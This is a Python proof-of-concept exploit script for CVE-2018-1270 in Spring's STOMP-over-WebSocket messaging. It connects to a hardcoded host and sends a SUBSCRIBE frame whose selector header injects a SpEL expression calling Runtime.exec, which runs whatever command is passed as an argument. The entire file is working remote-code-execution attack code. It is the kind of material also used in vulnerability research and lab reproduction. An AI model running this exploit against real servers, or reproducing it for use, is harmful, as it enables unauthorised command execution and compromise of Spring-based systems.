# -*- coding:utf-8 -*-
# Author: CF_HB
# DATA: 2019-04-27
# successful Tested on OSX (10.14.2)
# REFERER:
# https://github.com/vulhub/vulhub/tree/master/spring/CVE-2018-1270
# https://github.com/CaledoniaProject/CVE-2018-1270
# usage:
# python3.6  spring_message_rce.py "/Applications/Calculator.app/Contents/MacOS/Calculator"

import logging
import websocket
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

ws = websocket.WebSocket()
# ws.connect("ws://192.168.2.128:8080/hello", http_proxy_host="127.0.0.1", http_proxy_port=8000)

ws.connect("ws://192.168.2.128:8080/hello")

logging.info("Sending 'Hello, World'...")
txt1 = '''CONNECT
accept-version:1.1,1.0
heart-beat:10000,10000\n\n\x00'''
ws.send(txt1)
logging.info("Sent txt1")
logging.info("Receiving...")
result = ws.recv()
logging.info("Received '%s'" % result)

txt2 = '''SUBSCRIBE
selector:T(java.lang.Runtime).getRuntime().exec('%s')
id:sub-0
destination:/topic/greetings\n\n\x00''' % (sys.argv[1])
ws.send(txt2)
logging.info("Sent txt2")
logging.info("Receiving...")

ws.close()

logging.info("Exploit successful.....")
